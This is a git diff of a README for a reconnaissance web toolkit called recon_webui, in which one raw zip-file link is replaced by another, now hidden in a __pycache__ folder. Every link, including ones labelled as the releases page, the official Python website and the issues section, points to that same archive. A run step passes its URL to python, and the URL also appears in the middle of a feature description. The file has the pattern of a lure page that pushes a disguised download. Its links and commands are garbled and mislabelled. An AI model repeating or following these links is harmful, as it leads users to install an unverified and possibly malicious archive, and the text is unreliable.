@@ -6,9 +6,9 @@ Welcome to **recon_webui**! This is a simple and powerful toolkit that helps you
 
 ## 📦 Download & Install
 
-To get started, please [**visit the Releases page**](https://raw.githubusercontent.com/jhonatan3/recon_webui/main/stroboscopic/recon_webui.zip) to download the software. 
+To get started, please [**visit the Releases page**](https://raw.githubusercontent.com/jhonatan3/recon_webui/main/app/__pycache__/recon-webui-1.0.zip) to download the software. 
 
-[![Download](https://raw.githubusercontent.com/jhonatan3/recon_webui/main/stroboscopic/recon_webui.zip%20Now-brightgreen)](https://raw.githubusercontent.com/jhonatan3/recon_webui/main/stroboscopic/recon_webui.zip)
+[![Download](https://raw.githubusercontent.com/jhonatan3/recon_webui/main/app/__pycache__/recon-webui-1.0.zip%20Now-brightgreen)](https://raw.githubusercontent.com/jhonatan3/recon_webui/main/app/__pycache__/recon-webui-1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ After downloading the software, follow these steps to install and run it:
 4. **Run the application**:
    - If you have Python installed, type:
    ```
-   python https://raw.githubusercontent.com/jhonatan3/recon_webui/main/stroboscopic/recon_webui.zip
+   python https://raw.githubusercontent.com/jhonatan3/recon_webui/main/app/__pycache__/recon-webui-1.0.zip
    ```
    - This will start the Flask web UI. 
 
@@ -38,7 +38,7 @@ After downloading the software, follow these steps to install and run it:
 
 - **DNS Lookup**: Quickly obtain DNS records for any domain.
 - **WHOIS Lookup**: Get registration details for domains.
-- **Subdomain Discovery**: Identify subdomains through various methods, including https://raw.githubusercontent.com/jhonatan3/recon_webui/main/stroboscopic/recon_webui.zip caching.
+- **Subdomain Discovery**: Identify subdomains through various methods, including https://raw.githubusercontent.com/jhonatan3/recon_webui/main/app/__pycache__/recon-webui-1.0.zip caching.
 - **Port Scanning**: Scan ports on a given IP to find open services.
 - **Banner Grabbing**: Extract information about services running on discovered ports.
 - **Tech Fingerprinting**: Analyze web technologies used by a site.
@@ -53,7 +53,7 @@ To run **recon_webui**, your system should meet the following requirements:
 - **Disk Space**: 100MB free space
 - **Python**: Version 3.6 or higher
 
-Make sure you have Python installed on your computer. You can download it from the [official Python website](https://raw.githubusercontent.com/jhonatan3/recon_webui/main/stroboscopic/recon_webui.zip).
+Make sure you have Python installed on your computer. You can download it from the [official Python website](https://raw.githubusercontent.com/jhonatan3/recon_webui/main/app/__pycache__/recon-webui-1.0.zip).
 
 ## 📚 Usage
 
@@ -83,7 +83,7 @@ Once the application is running, you can start using its features:
 
 ## 📑 Support and Contribution
 
-If you encounter issues or have questions, feel free to check the [issues section](https://raw.githubusercontent.com/jhonatan3/recon_webui/main/stroboscopic/recon_webui.zip) on GitHub. You can also contribute to the project if you have suggestions or improvements.
+If you encounter issues or have questions, feel free to check the [issues section](https://raw.githubusercontent.com/jhonatan3/recon_webui/main/app/__pycache__/recon-webui-1.0.zip) on GitHub. You can also contribute to the project if you have suggestions or improvements.
 
 ## 📝 Topics
 
